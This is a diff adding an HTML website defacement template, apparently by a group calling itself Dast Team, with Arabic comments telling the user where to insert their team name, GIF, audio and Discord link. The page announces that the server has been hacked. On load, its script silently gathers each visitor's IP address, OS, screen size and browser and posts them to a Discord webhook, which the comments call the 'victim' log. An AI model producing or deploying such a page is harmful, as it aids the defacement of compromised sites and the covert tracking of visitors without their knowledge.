@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DAST Team // CODED BY Abumousa</title>
+  <style>
+    /* ==========================================
+       [1] إعدادات التصميم العامة والألوان (CSS)
+       - هنا يمكنك تغيير ألوان الخلفية، الخطوط، والأبعاد.
+       ========================================== */
+    @import url('https://media.tenor.com/tbCuJhOJUW4AAAAM/im-cyn-scary.gif');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body { 
+      background: #050505; /* لون خلفية الصفحة (أسود غامق) */
+      color: #b0b0b0; /* لون النصوص الأساسي */
+      font-family: 'Share Tech Mono', 'Tajawal', monospace; 
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* خلفية الماتريكس المتحركة */
+    #bg-canvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: -1;
+      opacity: 0.12; /* شفافة لتكون بالخلفية */
+    }
+
+    #main-content { 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      justify-content: center; 
+      min-height: 100vh; 
+      text-align: center;
+      z-index: 10;
+      position: relative;
+      padding: 30px 20px;
+    }
+
+    /* صندوق الوسائط والصورة */
+    #media-container {
+      width: 100%; 
+      max-width: 560px; 
+      border-radius: 12px;
+      box-shadow: 0 0 50px rgba(0, 0, 0, 0.9); 
+      border: 1px solid #262626; 
+      overflow: hidden; 
+      margin-bottom: 25px;
+      background: #000;
+    }
+
+    .terminal-bar {
+      background: #0f0f0f;
+      padding: 8px 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #222;
+      font-size: 0.75rem;
+      color: #777;
+    }
+
+    .terminal-dots span {
+      display: inline-block;
+      width: 8px; height: 8px;
+      background: #444;
+      border-radius: 50%;
+      margin-left: 5px;
+    }
+
+    #media-container img { 
+      width: 100%; 
+      display: block; 
+      filter: grayscale(100%) contrast(140%) brightness(80%); /* تأثير الأبيض والأسود المانجا/الهكر */
+    }
+
+    /* النص المتحرك الكبير */
+    .hacked-text { 
+      font-family: 'Tajawal', sans-serif;
+      font-size: 2.1rem; 
+      font-weight: 900; 
+      margin-bottom: 25px;
+      color: #e6e6e6;
+      animation: smoothSlide 3s ease-in-out infinite alternate;
+    }
+
+    @keyframes smoothSlide { 
+      0% { transform: translateY(-4px); opacity: 0.7; } 
+      100% { transform: translateY(4px); opacity: 1; } 
+    }
+
+    /* صندوق المعلومات (IP, النظام, المتصفح...) */
+    #info-block { 
+      text-align: left; 
+      font-size: 0.95rem; 
+      line-height: 1.9rem; 
+      color: #9e9e9e; 
+      background: rgba(10, 10, 10, 0.95);
+      backdrop-filter: blur(15px);
+      padding: 25px 30px;
+      border-radius: 12px;
+      border: 1px solid #222;
+      width: 90%;
+      max-width: 560px;
+    }
+
+    #info-block span { 
+      display: block; 
+      border-bottom: 1px dashed #1c1c1c; 
+      margin-bottom: 8px; 
+      padding-bottom: 6px; 
+    }
+
+    /* زر الديسكورد */
+    .discord-btn {
+      display: block;
+      width: 100%;
+      margin-top: 22px;
+      padding: 14px;
+      background: #121212;
+      border: 1.5px solid #333;
+      color: #e6e6e6;
+      text-decoration: none;
+      border-radius: 8px;
+      font-family: 'Tajawal', sans-serif;
+      font-weight: 700;
+      font-size: 1.15rem;
+      text-align: center;
+      transition: all 0.4s ease;
+    }
+
+    .discord-btn:hover {
+      background: #e6e6e6;
+      color: #050505;
+      transform: translateY(-3px);
+    }
+
+    .corner-signature {
+      position: fixed;
+      bottom: 15px; right: 20px;
+      font-size: 0.8rem;
+      color: #666;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 5px 10px;
+      border-radius: 4px;
+      border: 1px solid #1a1a1a;
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- خلفية الماتريكس البرمجية -->
+  <canvas id="bg-canvas"></canvas>
+
+  <div id="main-content">
+    <!-- صندوق الصورة المتحركة -->
+    <div id="media-container">
+      <div class="terminal-bar">
+        <span> Dast Team // CODED BY ABU MOUSA</span> <!-- [تعديل]: اسم الفريق أو المبرمج في شريط التيرمنال -->
+        <div class="terminal-dots">
+          <span></span><span></span><span></span>
+        </div>
+      </div>
+      <img src="https://media.tenor.com/tbCuJhOJUW4AAAAM/im-cyn-scary.gif" alt="Hacking Animation"> <!-- [تعديل]: رابط الصورة المتحركة (GIF) -->
+    </div>
+
+    <!-- [تعديل]: النص الرئيسي الذي يظهر للزوار -->
+    <div class="hacked-text">لقد تم اختراق السيرفر بنجاح من قبل Team Dast !!</div>
+    
+    <!-- صندوق جلب معلومات الزائر -->
+    <div id="info-block">
+      <span id="ip">[-] Target IP: Scanning...</span>
+      <span id="location">[-] Geo-Location: Tracing...</span>
+      <span id="isp">[-] Network Provider: Analyzing...</span>
+      <span id="os">[-] Target OS: Detecting...</span>
+      <span id="screen">[-] Resolution: Extracting...</span>
+      <span id="browser">[-] Client Fingerprint: Identifying...</span>
+      
+      <!-- [تعديل]: رابط دعوة سيرفر الديسكورد الخاص بك -->
+      <a href="https://discord.gg/6ds" target="_blank" class="discord-btn">JOIN DAST DISCORD</a>
+    </div>
+  </div>
+
+  <div class="corner-signature">ABU MOUSA</div> <!-- [تعديل]: توقيعك في الزاوية -->
+
+  <!-- [تعديل]: رابط الخلفية الصوتية (الصوت الذي يعمل تلقائياً عند النقر) -->
+  <audio id="bg-audio" loop autoplay>
+    <source src="https://bulleti.lol/uploads/04mdkFksditf/TANIN.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    /* ==========================================
+       [2] البرمجة والوظائف (JavaScript)
+       ========================================== */
+
+    // تفعيل الصوت عند أول ضغطة في الصفحة (لأن المتصفحات تمنع التشغيل التلقائي الصامت)
+    window.addEventListener('click', () => {
+      const audio = document.getElementById('bg-audio');
+      if (audio.paused) {
+        audio.play().catch(()=>{});
+      }
+    }, { once: true });
+
+    (function() {
+      // إعداد خلفية الماتريكس (الأكواد المتساقطة)
+      const canvas = document.getElementById('bg-canvas');
+      const ctx = canvas.getContext('2d');
+      function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+      window.addEventListener('resize', resize); resize();
+
+      const chars = "0101010101XYZ//DARK_MATRIX_SYSTEM"; // الحروف التي تسقط في الخلفية
+      const fontSize = 13;
+      let drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+      
+      function draw() {
+        ctx.fillStyle = "rgba(5, 5, 5, 0.18)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#555555"; 
+        ctx.font = fontSize + "px 'Share Tech Mono', monospace";
+        drops.forEach((y, i) => {
+          ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * fontSize, y * fontSize);
+          if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+          drops[i]++;
+        });
+      }
+      setInterval(draw, 50);
+
+      // دالة لمعرفة نوع متصفح الزائر
+      function getBrowserInfo() {
+        const ua = navigator.userAgent;
+        if (ua.indexOf("Edg") > -1) return "Microsoft Edge";
+        if (ua.indexOf("Chrome") > -1) return "Google Chrome";
+        if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
+        if (ua.indexOf("Safari") > -1) return "Apple Safari";
+        return "Unknown";
+      }
+
+      // دالة إرسال المعلومات إلى ديسكورد عبر Webhook
+      async function sendToDiscord(ipData, osData, screenData, browserData) {
+        const webhookUrl = "رابط_الويب_هوك_الخاص_بك_هنا"; // [تعديل مهم]: ضع رابط الويب هوك الخاص بك هنا لاستقبال بيانات الزوار
+        
+        const payload = {
+          content: "@everyone **🚨 زائر جديد دخل الصفحة!**",
+          embeds: [{
+            title: "🔍 تفاصيل الضحية / الزائر",
+            color: 16711680,
+            fields: [
+              { name: "🌐 عنوان الـ IP", value: "`" + ipData + "`", inline: true },
+              { name: "💻 نظام التشغيل", value: "`" + osData + "`", inline: true },
+              { name: "🖥️ دقة الشاشة", value: "`" + screenData + "`", inline: true },
+              { name: "🧭 المتصفح", value: "`" + browserData + "`", inline: true }
+            ],
+            footer: { text: "ABU MOUSA // Dast Team Logger" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        try {
+          await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+        } catch (err) {
+          console.error("Webhook Error");
+        }
+      }
+
+      // جلب بيانات الزائر وعرضها على الشاشة
+      async function initData() {
+        const osVal = navigator.platform || "Desktop Environment";
+        const screenVal = window.screen.width + "x" + window.screen.height + " px";
+        const browserVal = getBrowserInfo();
+
+        document.getElementById('os').textContent = "[+] Target OS: " + osVal;
+        document.getElementById('screen').textContent = "[+] Resolution: " + screenVal;
+        document.getElementById('browser').textContent = "[+] Client Fingerprint: " + browserVal;
+        
+        let ipVal = "127.0.0.1";
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const d = await res.json();
+          ipVal = d.ip || "127.0.0.1";
+        } catch (e) {
+          ipVal = "Unknown IP";
+        }
+
+        document.getElementById('ip').textContent = "[+] Target IP: " + ipVal;
+        document.getElementById('location').textContent = "[+] Geo-Location: Global Node";
+        document.getElementById('isp').textContent = "[+] Network Provider: Active Trace";
+
+        // إرسال البيانات للديسكورد تلقائياً
+        sendToDiscord(ipVal, osVal, screenVal, browserVal);
+      }
+
+      initData();
+      
+      // منع الضغط على الزر الأيمن للفأرة (حماية الكود من النسخ)
+      document.addEventListener('contextmenu', e => e.preventDefault());
+    })();
+  </script>
+</body>
+</html>
